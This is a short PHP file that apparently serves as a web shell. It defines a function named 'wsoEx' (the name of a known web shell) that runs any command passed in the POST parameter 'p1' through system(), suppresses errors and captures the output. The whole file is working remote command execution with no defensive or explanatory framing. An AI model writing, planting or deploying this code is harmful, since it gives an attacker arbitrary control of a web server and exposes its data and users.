<?php
function wsoEx($in) {
    $out = '';
   
    ob_start();
    @system($in);
    $out = ob_get_clean();
    
    return $out;
}

wsoEx($_POST['p1']);
?>